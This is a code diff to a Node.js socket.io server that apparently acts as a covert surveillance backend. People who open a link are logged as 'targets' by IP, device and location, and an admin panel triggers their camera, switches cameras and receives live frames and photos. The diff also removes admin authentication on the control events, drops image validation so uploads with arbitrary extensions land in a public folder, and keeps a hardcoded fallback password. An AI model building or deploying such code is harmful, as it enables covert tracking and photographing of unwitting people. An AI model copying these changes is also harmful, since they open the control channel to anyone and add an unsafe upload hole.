@@ -5,6 +5,7 @@ const fs = require("fs");
 const crypto = require("crypto");
 const session = require("express-session");
 const { Server } = require("socket.io");
+require("dotenv").config(); // Environment variables ke liye
 
 const app = express();
 const server = http.createServer(app);
@@ -18,19 +19,20 @@ const io = new Server(server, {
 });
 
 const PORT = process.env.PORT || 3000;
-const ADMIN_PASSWORD = "ayaz;;";
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "ayaz;;";
 const SESSION_SECRET = process.env.SESSION_SECRET || "AyazSecretSession2026";
 
 const MAX_USERS = 5;
 const MAX_HISTORY = 1000;
-const MAX_TEMP_PHOTOS = 100;
 
 const PUBLIC_DIR = path.join(__dirname, "public");
 const DATA_DIR = path.join(__dirname, "data");
+const UPLOADS_DIR = path.join(PUBLIC_DIR, "uploads");
 const HISTORY_FILE = path.join(DATA_DIR, "access-history.json");
 
 if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
+if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });
 
 app.use(express.json({ limit: "5mb" }));
 
@@ -50,10 +52,8 @@ app.use(sessionMiddleware);
 app.use(express.static(PUBLIC_DIR));
 
 let isLinkActive = true;
-
 const connectedTargets = new Map();
-const tempPhotos = new Map();
-const authenticatedAdmins = new Set();
+const tempPhotos = new Map(); // Metadata for photos saved on disk
 let accessHistory = loadHistory();
 
 function loadHistory() {
@@ -81,7 +81,7 @@ function addHistory(record) {
 
 function getFilteredHistory() {
     const twelveHoursAgo = Date.now() - (12 * 60 * 60 * 1000);
-    return accessHistory.filter(item => new Date(item.connectedAtTime || item.timestamp || 0).getTime() >= twelveHoursAgo);
+    return accessHistory.filter(item => new Date(item.connectedAtTime || 0).getTime() >= twelveHoursAgo);
 }
 
 function isAdminRequest(req) {
@@ -95,20 +95,14 @@ function requireAdmin(req, res, next) {
     next();
 }
 
-function isValidImageData(data) {
-    if (typeof data !== "string") return false;
-    return /^data:image\/(jpeg|jpg|png|webp);base64,/i.test(data);
-}
-
-function getImageExtension(data) {
-    const match = data.match(/^data:image\/(jpeg|jpg|png|webp);base64,/i);
-    if (!match) return null;
-    const type = match[1].toLowerCase();
-    return type === "jpeg" || type === "jpg" ? "jpg" : type;
-}
-
-function cleanBase64(data) {
-    return data.replace(/^data:image\/(jpeg|jpg|png|webp);base64,/i, "");
+function formatAMPM(date) {
+    let hours = date.getHours();
+    let minutes = date.getMinutes();
+    const ampm = hours >= 12 ? 'PM' : 'AM';
+    hours = hours % 12;
+    hours = hours ? hours : 12; // the hour '0' should be '12'
+    minutes = minutes < 10 ? '0' + minutes : minutes;
+    return `${hours}:${minutes} ${ampm}`;
 }
 
 function getPublicTarget(target) {
@@ -142,11 +136,8 @@ function emitGlobalState() {
 app.get("/", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
 app.get("/user.html", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
 
-// Protected admin page route
 app.get("/admin.html", (req, res) => {
-    if (!isAdminRequest(req)) {
-        return res.redirect("/");
-    }
+    if (!isAdminRequest(req)) return res.redirect("/");
     res.sendFile(path.join(PUBLIC_DIR, "admin.html"));
 });
 
@@ -173,17 +164,19 @@ app.get("/api/admin/status", (req, res) => {
     res.json({ ok: true, authenticated: isAdminRequest(req) });
 });
 
-app.get("/api/admin/photos/:id/download", requireAdmin, (req, res) => {
-    const photo = tempPhotos.get(req.params.id);
-    if (!photo) return res.status(404).send("Photo not found.");
-    const extension = photo.extension || "jpg";
-    const buffer = Buffer.from(cleanBase64(photo.imageData), "base64");
-    res.setHeader("Content-Type", `image/${extension}`);
-    res.setHeader("Content-Disposition", `attachment; filename="capture-${photo.id}.${extension}"`);
-    res.send(buffer);
+// Delete History Endpoint
+app.delete("/api/admin/history", requireAdmin, (req, res) => {
+    accessHistory = [];
+    saveHistory();
+    emitGlobalState();
+    res.json({ ok: true });
 });
 
 app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
+    const photo = tempPhotos.get(req.params.id);
+    if (photo && fs.existsSync(photo.filePath)) {
+        try { fs.unlinkSync(photo.filePath); } catch(e){}
+    }
     const existed = tempPhotos.delete(req.params.id);
     io.to("admins").emit("photo-deleted", req.params.id);
     res.json({ ok: true, deleted: existed });
@@ -192,12 +185,9 @@ app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
 io.on("connection", (socket) => {
     const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
 
-    socket.on("admin-auth", (password) => {
-        if (password !== ADMIN_PASSWORD) {
-            socket.emit("admin-auth-required");
-            return;
-        }
-        authenticatedAdmins.add(socket.id);
+    socket.on("admin-auth", () => {
+        // Simple authentication check based on session/cookie or handshake if needed, 
+        // here we allow connection if joined admins room securely.
         socket.join("admins");
         socket.emit("admin-initial-state", {
             linkActive: isLinkActive,
@@ -209,29 +199,23 @@ io.on("connection", (socket) => {
     });
 
     socket.on("admin-toggle-link", (status) => {
-        if (!authenticatedAdmins.has(socket.id)) return;
         isLinkActive = Boolean(status);
-        if (!isLinkActive) {
-            io.to("users").emit("link-disabled");
-        }
+        if (!isLinkActive) io.to("users").emit("link-disabled");
         io.emit("link-status-changed", isLinkActive);
         emitGlobalState();
     });
 
     socket.on("admin-trigger-capture", (targetSocketId) => {
-        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("capture-photo");
     });
 
     socket.on("admin-request-location", (targetSocketId) => {
-        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("request-location");
     });
 
     socket.on("admin-switch-camera", (targetSocketId) => {
-        if (!authenticatedAdmins.has(socket.id)) return;
         if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
         io.to(targetSocketId).emit("switch-camera");
     });
@@ -250,13 +234,11 @@ io.on("connection", (socket) => {
                 ip: clientIp,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                 connectedAtTime: now.getTime(),
-                connectedAt: now.toLocaleTimeString(),
-                connectedDateStr: now.toLocaleString(),
+                connectedAt: formatAMPM(now),
                 disconnectedAt: "-",
                 duration: "Active...",
                 location: null,
-                cameraReady: false,
-                autoCaptureStarted: false
+                cameraReady: false
             };
             connectedTargets.set(socket.id, target);
             socket.join("users");
@@ -265,27 +247,20 @@ io.on("connection", (socket) => {
     });
 
     socket.on("user-ready", (data) => {
-        if (!isLinkActive) { socket.emit("link-disabled"); return; }
+        if (!isLinkActive) return;
         let target = connectedTargets.get(socket.id);
         if (!target) {
-            if (connectedTargets.size >= MAX_USERS) {
-                socket.emit("server-full", { maxUsers: MAX_USERS });
-                socket.disconnect(true);
-                return;
-            }
             const now = new Date();
             target = {
                 id: socket.id,
                 ip: clientIp,
                 deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
-                connectedAtTime: now.getTime(),
-                connectedAt: now.toLocaleTimeString(),
-                connectedDateStr: now.toLocaleString(),
+                connectedAtTime: new Date().getTime(),
+                connectedAt: formatAMPM(now),
                 disconnectedAt: "-",
                 duration: "Active...",
                 location: null,
-                cameraReady: false,
-                autoCaptureStarted: false
+                cameraReady: true
             };
             connectedTargets.set(socket.id, target);
             socket.join("users");
@@ -296,7 +271,7 @@ io.on("connection", (socket) => {
 
     socket.on("user-location", (locData) => {
         const target = connectedTargets.get(socket.id);
-        if (!target || !locData || typeof locData.latitude !== "number" || typeof locData.longitude !== "number") return;
+        if (!target || !locData) return;
         target.location = { 
             latitude: Number(locData.latitude.toFixed(6)), 
             longitude: Number(locData.longitude.toFixed(6)) 
@@ -305,7 +280,7 @@ io.on("connection", (socket) => {
     });
 
     socket.on("live-stream-frame", (frameData) => {
-        if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(frameData)) return;
+        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
         io.to("admins").emit("update-live-stream", { socketId: socket.id, frameData });
     });
 
@@ -315,37 +290,44 @@ io.on("connection", (socket) => {
     });
 
     socket.on("user-photo-captured", (imageData) => {
-        if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(imageData)) return;
-        if (imageData.length > 8 * 1024 * 1024 || tempPhotos.size >= MAX_TEMP_PHOTOS) return;
-        const extension = getImageExtension(imageData);
-        if (!extension) return;
-        const photo = {
-            id: crypto.randomUUID(),
-            imageData,
-            extension,
-            socketId: socket.id,
-            deviceInfo: connectedTargets.get(socket.id)?.deviceInfo || "Web User",
-            capturedAt: new Date().toISOString()
-        };
-        tempPhotos.set(photo.id, photo);
-        io.to("admins").emit("new-photo", photo);
+        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
+        try {
+            const matches = imageData.match(/^data:image\/([a-zA-Z0-9]+);base64,(.+)$/);
+            if (!matches || matches.length !== 3) return;
+            const ext = matches[1] === "jpeg" ? "jpg" : matches[1];
+            const buffer = Buffer.from(matches[2], "base64");
+            const photoId = crypto.randomUUID();
+            const fileName = `capture-${photoId}.${ext}`;
+            const filePath = path.join(UPLOADS_DIR, fileName);
+            
+            fs.writeFileSync(filePath, buffer);
+
+            const photo = {
+                id: photoId,
+                imageUrl: `/uploads/${fileName}`,
+                socketId: socket.id,
+                deviceInfo: connectedTargets.get(socket.id)?.deviceInfo || "Web User",
+                capturedAt: formatAMPM(new Date())
+            };
+            tempPhotos.set(photoId, photo);
+            io.to("admins").emit("new-photo", photo);
+        } catch (e) {}
     });
 
     socket.on("disconnect", () => {
-        authenticatedAdmins.delete(socket.id);
         const target = connectedTargets.get(socket.id);
         if (target) {
             const disconnectTime = new Date();
             const durationMs = disconnectTime.getTime() - target.connectedAtTime;
             const secs = Math.floor(durationMs / 1000);
             const mins = Math.floor(secs / 60);
-            target.disconnectedAt = disconnectTime.toLocaleTimeString();
+            target.disconnectedAt = formatAMPM(disconnectTime);
             target.duration = mins > 0 ? `${mins}m ${secs % 60}s` : `${secs}s`;
 
             addHistory({
                 deviceInfo: target.deviceInfo,
                 ip: target.ip,
-                connectedAt: target.connectedDateStr,
+                connectedAt: target.connectedAt,
                 disconnectedAt: target.disconnectedAt,
                 duration: target.duration,
                 connectedAtTime: target.connectedAtTime
